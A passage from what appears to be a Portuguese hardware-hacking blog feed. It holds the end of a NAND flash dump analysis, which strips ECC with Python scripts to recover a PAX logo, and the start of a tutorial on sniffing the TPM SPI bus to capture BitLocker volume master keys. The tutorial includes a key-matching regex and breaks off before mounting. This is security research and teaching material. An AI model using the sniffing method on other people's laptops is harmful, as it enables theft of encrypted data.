7880704       0x784000        Rising entropy edge <span class="o">(</span>0.995063<span class="o">)</span>
12345344      0xBC6000        Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
20869120      0x13E7000       Rising entropy edge <span class="o">(</span>0.997811<span class="o">)</span>
29257728      0x1BE7000       Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
33824768      0x2042000       Rising entropy edge <span class="o">(</span>0.999076<span class="o">)</span>
40386560      0x2684000       Falling entropy edge <span class="o">(</span>0.372003<span class="o">)</span>
47253504      0x2D10800       Falling entropy edge <span class="o">(</span>0.725862<span class="o">)</span>
62879744      0x3BF7800       Falling entropy edge <span class="o">(</span>0.737729<span class="o">)</span>
67244032      0x4021000       Rising entropy edge <span class="o">(</span>0.966013<span class="o">)</span>
67311616      0x4031800       Falling entropy edge <span class="o">(</span>0.776734<span class="o">)</span>
69611520      0x4263000       Falling entropy edge <span class="o">(</span>0.790624<span class="o">)</span>
69679104      0x4273800       Rising entropy edge <span class="o">(</span>0.972091<span class="o">)</span>
69814272      0x4294800       Falling entropy edge <span class="o">(</span>0.836573<span class="o">)</span>
70322176      0x4310800       Falling entropy edge <span class="o">(</span>0.844177<span class="o">)</span>
72689664      0x4552800       Falling entropy edge <span class="o">(</span>0.643195<span class="o">)</span>
74008576      0x4694800       Falling entropy edge <span class="o">(</span>0.783870<span class="o">)</span>
74584064      0x4721000       Falling entropy edge <span class="o">(</span>0.471472<span class="o">)</span>
75259904      0x47C6000       Falling entropy edge <span class="o">(</span>0.787818<span class="o">)</span>
76613632      0x4910800       Falling entropy edge <span class="o">(</span>0.823394<span class="o">)</span>
76748800      0x4931800       Falling entropy edge <span class="o">(</span>0.687502<span class="o">)</span>
82837504      0x4F00000       Falling entropy edge <span class="o">(</span>0.360502<span class="o">)</span>
84291584      0x5063000       Falling entropy edge <span class="o">(</span>0.775172<span class="o">)</span>
84934656      0x5100000       Falling entropy edge <span class="o">(</span>0.714603<span class="o">)</span>
95385600      0x5AF7800       Falling entropy edge <span class="o">(</span>0.788762<span class="o">)</span>
103233536     0x6273800       Falling entropy edge <span class="o">(</span>0.775540<span class="o">)</span>
104992768     0x6421000       Falling entropy edge <span class="o">(</span>0.750242<span class="o">)</span>
124475392     0x76B5800       Falling entropy edge <span class="o">(</span>0.281623<span class="o">)</span>
125253632     0x7773800       Falling entropy edge <span class="o">(</span>0.750710<span class="o">)</span>
133507072     0x7F52800       Falling entropy edge <span class="o">(</span>0.798972<span class="o">)</span>
137566208     0x8331800       Falling entropy edge <span class="o">(</span>0.768062<span class="o">)</span>
137701376     0x8352800       Falling entropy edge <span class="o">(</span>0.743758<span class="o">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-entropy.svg" alt="Entropia da Imagem Lida" /><em>Entropia da Imagem Lida</em></p>

<p>No gr√°fico de entropia apresentado, as √°reas de alta entropia se destacam como picos que se aproximam do valor 1 no eixo vertical. Estas regi√µes apontam para trechos de dados que t√™m uma distribui√ß√£o que parece aleat√≥ria de bits, o que √© t√≠pico de dados compactados ou criptografados.</p>

<p>Ao cruzar a posi√ß√£o destes picos com as informa√ß√µes fornecidas pelo comando <code class="language-plaintext highlighter-rouge">binwalk</code>, conseguimos entender a natureza destes segmentos de alta entropia. No nosso caso, os pontos de alta entropia correspondem a partes compactadas, e n√£o a dados criptografados. Essa dedu√ß√£o fica clara quando vemos que o <code class="language-plaintext highlighter-rouge">binwalk</code> identificou assinaturas relacionadas a dados compactados com <em>gzip</em> nas posi√ß√µes indicadas.</p>

<p>O fato de reconhecer essas assinaturas mostra claramente que o conte√∫do, apesar de compactado, n√£o est√° criptografado. Se fosse, o <code class="language-plaintext highlighter-rouge">binwalk</code> n√£o teria identificado essas assinaturas, pois os dados criptografados se parecem com um monte de informa√ß√µes aleat√≥rias, sem padr√µes espec√≠ficos. Ent√£o, olhando tanto o gr√°fico de entropia quanto as informa√ß√µes do <code class="language-plaintext highlighter-rouge">binwalk</code>, conseguimos uma boa ideia da estrutura e tipo dos dados na mem√≥ria flash analisada.</p>

<h2 id="quando-a-dispers√£o-do-ecc-n√£o-√©-padr√£o">Quando a dispers√£o do ECC n√£o √© padr√£o</h2>

<p>Para garantir que os dados sejam acessados de forma precisa, √© fundamental excluir os bits de paridade inseridos em cada p√°gina de mem√≥ria. Supondo que os √∫ltimos 64 bytes de cada p√°gina sejam alocados para o ECC, podemos criar um script Python que l√™ os 2112 bytes (representando a p√°gina completa de mem√≥ria) e grava somente os 2048 bytes correspondentes ao dado puro, desconsiderando o ECC, em um novo arquivo.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">F59L1G81MA@BGA63_1111.BIN</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">o</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">FIXEDDATA.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[:</span><span class="mi">2048</span><span class="p">])</span> <span class="c1"># Nuke ECC
</span>  <span class="n">o</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">o</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Com os dados agora limpos, a pr√≥xima etapa √© identificar os arquivos presentes para verificar a efic√°cia da nossa suposi√ß√£o. Uma olhada r√°pida na lista de arquivos destacados pelo <em>binwalk</em> nos fornecer√° uma indica√ß√£o.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
438548        0x6B114         Base64 standard index table
439650        0x6B562         DES PC1 table
439738        0x6B5BA         DES PC2 table
440945        0x6BA71         DES SP2, little endian
441738        0x6BD8A         DES SP1, little endian
477666        0x749E2         Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
478540        0x74D4C         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
479065        0x74F59         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
1384724       0x152114        Base64 standard index table
1385826       0x152562        DES PC1 table
1385914       0x1525BA        DES PC2 table
1387121       0x152A71        DES SP2, little endian
1387914       0x152D8A        DES SP1, little endian
1423842       0x15B9E2        Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
1424716       0x15BD4C        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
1425241       0x15BF59        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
7839754       0x77A00A        uImage header, header size: 64 bytes, header <span class="o">(</span>...<span class="o">)</span>
7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>litt<span class="o">(</span>...<span class="o">)</span>
7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression,   <span class="o">(</span>...<span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>
</code></pre></div></div>

<p>Podemos identificar um <em>bitmap</em> logo no come√ßo da imagem, onde o <em>binwalk</em> consegue inclusive identificar o tamanho e profundidade de bits dele:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
</code></pre></div></div>

<p>Uma caracter√≠stica marcante dos <em>bitmaps</em> √© a forma como armazenam informa√ß√µes de cores. Os bytes no arquivo mapeiam diretamente para as cores da imagem. Assim, quando temos uma regi√£o da imagem que apresenta uma √∫nica cor, essa cor √© representada por sequ√™ncias consecutivas de bytes id√™nticos no arquivo. Essa propriedade √© especialmente √∫til quando tentamos discernir a distribui√ß√£o dos bits de corre√ß√£o de erro (ECC). Se um segmento do bitmap, que se ajusta a uma p√°gina de mem√≥ria, exibe a mesma cor que outro segmento em uma p√°gina diferente, √© esperado que seus bits de ECC correspondentes sejam id√™nticos.</p>

<p>Considerando que a imagem identificada possui uma profundidade de cor de 24 bpp (bits por pixel), cada pixel √© representado por 3 bytes. Dada a capacidade de uma p√°gina de mem√≥ria ser de 2048 bytes, isso se traduz em cerca de 682 pixels por p√°gina. Isso √© ligeiramente mais do que duas linhas da imagem. A tentativa de acessar o <em>bitmap</em> na sua forma atual sugere inconsist√™ncias, o que nos leva a questionar nossas suposi√ß√µes iniciais sobre a distribui√ß√£o dos bits de ECC.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/pax-broken.jpg" alt="Logotipo corrompido da PAX" /><em>Logotipo corrompido da PAX</em></p>

<p>Para uma interpreta√ß√£o adequada, √© vital extrair v√°rias p√°ginas da mem√≥ria contendo os dados do bitmap de forma alinhada. Dessa forma, podemos ter certeza de que a cada intervalo de 2112 bytes, estamos lidando com uma nova p√°gina, e n√£o uma continua√ß√£o da anterior. Posteriormente, podemos utilizar um software de edi√ß√£o de imagem que permita manipular imagens em formatos ‚ÄúRAW‚Äù arbitr√°rios. Neste contexto, utilizaremos o GIMP para analisar os dados crus da imagem. Uma das vantagens do GIMP √© a flexibilidade em definir a geometria da imagem e a formata√ß√£o dos pixels.</p>

<p>Para facilitar a identifica√ß√£o dos bits de ECC, definiremos a largura da imagem como 2112, correspondendo ao tamanho da p√°gina de mem√≥ria. Isso permitir√° visualizar cada p√°gina de mem√≥ria como uma linha distinta. Vamos escolher uma representa√ß√£o de 8 bits por pixel, em tom monocrom√°tico, para garantir uma correspond√™ncia exata de 2112 bytes por linha. Em rela√ß√£o √† altura, optaremos por, no m√≠nimo, 100 linhas, de modo a proporcionar uma vis√£o clara das varia√ß√µes entre as diferentes p√°ginas de mem√≥ria.</p>

<p>Ao examinar a representa√ß√£o visual fornecida pelo GIMP, notamos segmentos claramente definidos de 512 bytes dentro de cada p√°gina de mem√≥ria. Esses segmentos s√£o intercalados com colunas mais finas, cuja apar√™ncia parece diretamente influenciada pelo bloco adjacente.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis.jpg" alt="Blocos de 512 bytes" /><em>Blocos de 512 bytes</em></p>

<p>Observando mais atentamente, percebemos que as linhas completamente pretas apresentam uma coluna com padr√µes consistentes √† esquerda da marca√ß√£o de 512 bytes. Contrapondo-se a isso, linhas que exibem alguma varia√ß√£o tamb√©m manifestam discrep√¢ncias nessa mesma coluna √† esquerda. Com base nessa observa√ß√£o, podemos inferir que as colunas posicionadas tanto √† esquerda quanto √† direita do segmento de 512 bytes representam, de fato, dados de paridade, e n√£o s√£o parte intr√≠nseca do bitmap. Isso se torna ainda mais evidente considerando que as primeiras linhas do bitmap s√£o inteiramente pretas.</p>

<p>Ao considerar a p√°gina de mem√≥ria em sua totalidade, outro detalhe se destaca: apesar do padr√£o observado, h√° uma coluna completamente branca em uma posi√ß√£o inesperada. Al√©m disso, a primeira coluna, que teoricamente deveria ser branca, parece estar deslocada ou alterada de alguma forma.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-1.png" alt="Coluna aparentemente trocada de lugar" /><em>Coluna aparentemente trocada de lugar</em></p>

<p>A hip√≥tese levantada sugere que, por alguma raz√£o, essas colunas podem ter sido trocadas de lugar durante o processo de dispers√£o. Para validar essa suposi√ß√£o, uma abordagem pr√°tica seria utilizar o pr√≥prio GIMP para reposicionar a coluna e avaliar se o conte√∫do resultante se alinha de forma harmoniosa com o restante da p√°gina de mem√≥ria.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-3.png" alt="Trocando colunas identificadas de local" /><em>Trocando colunas identificadas de local</em></p>

<p>A imagem acima valida nossa conjectura, destacando que a realoca√ß√£o das colunas proporciona uma visualiza√ß√£o mais coerente do conte√∫do. Embora pare√ßa incomum √† primeira vista, considerando a natureza de seguran√ßa do dispositivo, √© plaus√≠vel pensar que essa disposi√ß√£o alterada possa ser uma forma deliberada de esconder dados. Essa peculiaridade n√£o √© mencionada em nenhuma documenta√ß√£o p√∫blica dispon√≠vel para o processador do dispositivo.</p>

<p>Com base nessas descobertas, temos as ferramentas necess√°rias para aprimorar nosso script em Python, visando eliminar os bits de paridade e rearranjar os segmentos de 512 bytes, com o objetivo de obter uma imagem refinada e coerente.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">F59L1G81MA@BGA63_1111.BIN</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">o</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">FIXEDDATA.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">535</span><span class="p">:</span><span class="mi">535</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1060</span><span class="p">:</span><span class="mi">1060</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1585</span><span class="p">:</span><span class="mi">1585</span><span class="o">+</span><span class="mi">512</span><span class="p">])</span>
  <span class="n">data</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="mi">48</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">page</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
  <span class="n">o</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">o</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Ap√≥s todos os passos de an√°lise e corre√ß√£o, conseguimos extrair o <em>bitmap</em> e validar que todas as nossas hip√≥teses e m√©todos de an√°lise estavam corretos:
<img src="/assets/posts/analise-e-decodificacao-flash/pax-fixed.jpg" alt="Logotipo &quot;ajustado&quot; da PAX" /><em>Logotipo ‚Äúajustado‚Äù da PAX</em></p>

<h2 id="conclus√£o">Conclus√£o</h2>

<p>√â essencial destacar que nossa abordagem se limitou a <strong>remover</strong> os bits de paridade, sem aplicar de fato o algoritmo de corre√ß√£o de erros. Como mencionado anteriormente, as mem√≥rias flash, particularmente as do tipo NAND, podem apresentar bits defeituosos, inclusive desde sua fabrica√ß√£o. A omiss√£o do algoritmo de ECC espec√≠fico pode resultar em inconsist√™ncias nos dados finais.</p>

<p>Por sorte, o conte√∫do deste dispositivo espec√≠fico <strong>n√£o</strong> estava criptografado, o que nos facilitou na an√°lise de dispers√£o, aproveitando-se apenas de um conte√∫do conhecido. Se o conte√∫do estivesse criptografado, seria essencial identificar um padr√£o recorrente (como p√°ginas de mem√≥ria vazias) onde a informa√ß√£o de ECC estaria gravada.</p>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[Explorando memorias NAND]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TPM 2.0: Extrair chaves do Bitlocker por SPI</title><link href="https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker" rel="alternate" type="text/html" title="TPM 2.0: Extrair chaves do Bitlocker por SPI" /><published>2024-01-16T23:48:00+00:00</published><updated>2024-01-16T23:48:00+00:00</updated><id>https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker</id><content type="html" xml:base="https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker"><![CDATA[<p>O TPM 2.0, tamb√©m conhecido como Trusted Platform Module 2.0, √© um recurso de seguran√ßa de hardware que est√° incorporado em muitos computadores modernos. Sua finalidade √© proporcionar uma maneira segura de armazenar chaves criptogr√°ficas e outros dados sens√≠veis, tais como senhas e certificados digitais, visando proteger contra diversas amea√ßas de seguran√ßa, incluindo acesso n√£o autorizado ao hardware e software de um computador. O TPM 2.0 representa uma evolu√ß√£o da especifica√ß√£o original do TPM, desenvolvida pelo Trusted Computing Group (TCG), e apresenta recursos e capacidades adicionais, como suporte a algoritmos criptogr√°ficos adicionais e a capacidade de armazenar quantidades maiores de dados.</p>

<h3 id="coisas-boas">Coisas boas</h3>

<p>Atualmente, o Trusted Platform Module (TPM) √© amplamente utilizado por mecanismos de criptografia de disco completo (Full Disk Encryption - FDE) e tamb√©m por criptografia espec√≠fica do dispositivo, j√° que geralmente est√° vinculado ao dispositivo (soldado na placa-m√£e).</p>

<p>√â not√°vel que, al√©m de ser um recurso de seguran√ßa avan√ßado em m√°quinas modernas, o protocolo de comunica√ß√£o utilizado pelos Integrated Circuits (ICs) TPM √© bastante simples. Geralmente, os ICs TPM utilizam o protocolo de comunica√ß√£o Serial Peripheral Interface (SPI), mas tamb√©m podem utilizar o protocolo Low Pin Count (LPC) e o protocolo Inter-Integrated Circuit (I2C). Uma quest√£o importante a ser levantada √© que os usu√°rios geralmente confiam no TPM como uma medida de seguran√ßa confi√°vel, no entanto, o tr√°fego no barramento geralmente √© transmitido em texto simples. Por exemplo, ap√≥s o desbloqueio do TPM, a chave do Bitlocker do Windows √© transmitida em texto simples no barramento.</p>

<p>Para este artigo, as suposi√ß√µes e an√°lises s√£o baseadas na especifica√ß√£o 2.0, vers√£o 1.03v22 do TPM (na data do artigo atual, a especifica√ß√£o mais utilizada em computadores dom√©sticos e servidores), que est√° dispon√≠vel aqui: <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>

<p>Al√©m disso, √© importante mencionar que este artigo se baseia em outros dois artigos, que podem ser encontrados nos seguintes links:</p>

<p><a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>

<p><a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>

<p>Cabe ressaltar que at√© o presente momento, o conhecimento aplicado com sucesso permitiu a extra√ß√£o de uma chave do Bitlocker em um cen√°rio real.</p>

<h3 id="transa√ß√£o-spi-do-tpm">Transa√ß√£o SPI do TPM</h3>

<p>Uma transa√ß√£o do Trusted Platform Module (TPM) por meio do protocolo Serial Peripheral Interface (SPI) √© uma s√©rie de opera√ß√µes executadas por um dispositivo TPM. Essas opera√ß√µes incluem, normalmente, a inicializa√ß√£o do TPM, a cria√ß√£o e gerenciamento de chaves criptogr√°ficas e a execu√ß√£o de opera√ß√µes criptogr√°ficas, como criptografia e assinatura.</p>

<p>Um exemplo comum de uso do TPM √© proteger as chaves de criptografia de um sistema, permitindo que o sistema seja iniciado somente se o TPM permitir ap√≥s uma s√©rie de verifica√ß√µes de seguran√ßa. Outro exemplo √© criar uma conex√£o segura com outro dispositivo, criando um par de chaves exclusivo, armazenando a chave privada no TPM e compartilhando a chave p√∫blica com o outro dispositivo.</p>

<p>As transa√ß√µes do dispositivo TPM s√£o normalmente executadas interagindo com um driver de dispositivo TPM, que √© um software que se comunica com o dispositivo TPM e gerencia suas opera√ß√µes. As transa√ß√µes do dispositivo TPM s√£o normalmente governadas pela Application Programming Interface (API) da biblioteca TPM2.0.</p>

<p>Existem v√°rios tipos de transa√ß√µes que podem ser analisados por meio do SPI, por√©m, para o prop√≥sito de recuperar as chaves do Bitlocker, apenas dois s√£o relevantes: FIFO Write e FIFO Read. O foco nessas duas opera√ß√µes √© necess√°rio para acessar a chave Volume Master Key (VMK), que √© respons√°vel por criptografar a chave AES256-XTS.</p>

<p>A VMK √© criptografada pelo TPM e armazenada no cabe√ßalho Bitlocker do disco de destino. Durante o processo de inicializa√ß√£o, o carregador de inicializa√ß√£o do Windows recupera a VMK criptografada do cabe√ßalho Bitlocker e envia-a para o TPM como uma solicita√ß√£o de descriptografia. O TPM, ent√£o, envia de volta a vers√£o descriptografada da VMK, assumindo que o TPM est√° configurado corretamente e todas as verifica√ß√µes de seguran√ßa foram aprovadas. O resultado do processo de descriptografia depende da configura√ß√£o do TPM.</p>

<p>Em sistemas com inicializa√ß√£o segura completa, o TPM exige que m√∫ltiplos hashes sejam corretamente inicializados durante as primeiras etapas do processo de inicializa√ß√£o. Os detalhes espec√≠ficos desse processo est√£o fora do escopo desta explica√ß√£o, mas √© importante observar que cada etapa do processo de inicializa√ß√£o do sistema faz um hash da pr√≥xima etapa e carrega-o no TPM. Por exemplo, a primeira etapa √© um bootrom dentro da CPU que verifica a assinatura da primeira etapa do BIOS.</p>

<h3 id="interceptando-o-tpm">Interceptando o TPM</h3>

<p>O chip Trusted Platform Module (TPM) geralmente est√° localizado na placa-m√£e de uma forma que n√£o √© facilmente acess√≠vel, por exemplo, no lado do teclado de um laptop. No entanto, como o protocolo Serial Peripheral Interface (SPI) √© um protocolo de barramento, √© poss√≠vel inferir que todos os dispositivos SPI na placa-m√£e utilizem as mesmas linhas de clock e dados. Como resultado, √© poss√≠vel conectar um analisador l√≥gico √† mem√≥ria flash SPI que armazena o c√≥digo BIOS/UEFI e monitorar quaisquer transa√ß√µes SPI que ocorram quando a mem√≥ria flash estiver inativa (quando o sinal de sele√ß√£o do chip para a mem√≥ria flash estiver baixo). Essa abordagem permite detectar as transa√ß√µes relevantes para recuperar as chaves do Bitlocker.
<img src="/assets/posts/patreon/Pasted image 20230124034954.png" alt="" />
<img src="/assets/posts/patreon/Pasted image 20230124035004.png" alt="" /></p>

<p>Este m√©todo, no entanto, pode levar a complica√ß√µes potenciais se houver outros dispositivos conectados ao mesmo barramento SPI, al√©m da mem√≥ria flash SPI e do TPM. Embora seja relativamente improv√°vel que v√°rios dispositivos estejam conectados ao mesmo barramento nesse contexto.</p>

<p>No pulseview, podemos analisar os bytes SPI usando a fun√ß√£o decodificadora de SPI.
<img src="/assets/posts/patreon/Pasted image 20230124035010.png" alt="" />
<img src="/assets/posts/patreon/Pasted image 20230124035020.png" alt="" /></p>

<p>Em seguida, precisamos configurar o decodificador SPI para os sinais corretos para poder ver os bytes decodificados.
<img src="/assets/posts/patreon/Pasted image 20230124035029.png" alt="" /></p>

<p>Ent√£o, voc√™ notar√° que, como deixamos o campo de polaridade do CS# como ‚Äú<strong>active-low</strong>‚Äù, ele est√° decodificando apenas as transa√ß√µes do BIOS Flash, n√£o o ‚Äúresto‚Äù do barramento.
<img src="/assets/posts/patreon/Pasted image 20230124035036.png" alt="" /></p>

<p>Se selecionarmos ‚Äú<strong>active-high</strong>‚Äù, analisaremos qualquer coisa que <strong>n√£o</strong> seja o BIOS flash (que √© o que queremos):
<img src="/assets/posts/patreon/Pasted image 20230124035040.png" alt="" /></p>

<p>Agora temos bytes analisados para o SPI, o que torna mais f√°cil para n√≥s trabalharmos com eles. Agora precisamos criar um plugin do sigrok para analis√°-lo.</p>

<h3 id="analisando-o-tpm-no-sigrok--pulseview">Analisando o TPM no Sigrok / Pulseview</h3>

<p>A cria√ß√£o de um plugin Sigrok √© um processo simples, gra√ßas ao guia oficial detalhado dispon√≠vel no site do Sigrok em <a href="https://sigrok.org/wiki/Protocol_decoder_HOWTO">https://sigrok.org/wiki/Protocol_decoder_HOWTO</a>. Dado que estamos trabalhando com o protocolo Serial Peripheral Interface (SPI), √© adequado utilizar a funcionalidade ‚ÄúDecodificador de Pilha‚Äù do Sigrok, que permite encadear v√°rios decodificadores e usar a sa√≠da de um decodificador como entrada de outro. Essa abordagem simplifica o processo, eliminando a necessidade de localizar e extrair manualmente bits individuais de dados dos dados brutos do SPI e permite que o foco seja nos bytes formados reais produzidos pelo decodificador SPI do Sigrok.</p>

<p>Para come√ßar, √© necess√°rio criar uma pasta ‚Äútpmdecoder‚Äù na pasta de plugins (no Linux, ela est√° localizada em ~/.local/share/libsigrokdecode/decoders/), com os seguintes arquivos anexados a esta postagem:</p>

<ul>
  <li><strong>init</strong>.py</li>
  <li>pd.py</li>
</ul>

<p>Esses s√£o os arquivos necess√°rios para o decodificador que foi desenvolvido. Basicamente, foi criado um decodificador para os registradores TPM, conforme descrito em <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>

<p>Ap√≥s criar e salvar o projeto do PulseView, √© necess√°rio fechar e abrir novamente. O plugin deve ser carregado automaticamente. Na configura√ß√£o do plugin SPI, na op√ß√£o ‚ÄúDecodificador de Pilha‚Äù, a op√ß√£o ‚ÄúTPM2.0‚Äù dever√° estar dispon√≠vel.
<img src="/assets/posts/patreon/Pasted image 20230124035119.png" alt="" />
E depois de selecionar, ele come√ßar√° a tentar encontrar mensagens TPM2.0 sobre os dados SPI. <img src="/assets/posts/patreon/Pasted image 20230124035129.png" alt="" /></p>

<h3 id="chave-do-bitlocker">Chave do Bitlocker</h3>

<p>Para esta se√ß√£o, √© altamente recomend√°vel verificar a documenta√ß√£o do <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc">libbde</a> no GitHub. A documenta√ß√£o cont√©m praticamente todas (se n√£o todas) as informa√ß√µes relacionadas ao Bitlocker, incluindo as vers√µes legadas.</p>

<p>A chave que desejamos recuperar √©, na verdade, a chave mestra de volume do Bitlocker, que possui um formato espec√≠fico. Podemos usar uma express√£o regular para recuperar essa chave em vez de tentar entender cada solicita√ß√£o, o que levaria mais tempo para criar um decodificador.</p>

<p>Os dados que s√£o realmente criptografados pelo TPM s√£o uma entrada de metadados FVE, como descrito na se√ß√£o <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc#53-fve-metadata-entry">5.3 do libbde</a>. Isso apresenta alguns cabe√ßalhos que podem ser combinados com uma express√£o regular.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})
</code></pre></div></div>

<p>Depois de todo o cabe√ßalho, a chave Volume Master Key (VMK) √© concatenada. Para encontrar a chave, basta procurar por 64 caracteres (32 bytes, o que corresponde a uma chave de 256 bits).</p>

<p>Para facilitar o uso, o decodificador anexado imprime as chaves encontradas no terminal de decodifica√ß√£o (para que n√£o seja necess√°rio usar a interface do PulseView, se n√£o desejado) e tamb√©m mostra em uma linha separada no PulseView.
<img src="/assets/posts/patreon/Pasted image 20230124035206.png" alt="" /></p>

<h3 id="acessando-dados-usando-o-vmk-descarregado">Acessando dados usando o VMK descarregado</h3>

<p>Para acessar os dados criptografados pelo Bitlocker, utilizaremos o projeto dislocker (<a href="https://github.com/Aorimn/dislocker">https://github.com/Aorimn/dislocker</a>) para montar a parti√ß√£o como texto simples. Antes disso, √© necess√°rio salvar a chave inteira como um arquivo:</p>

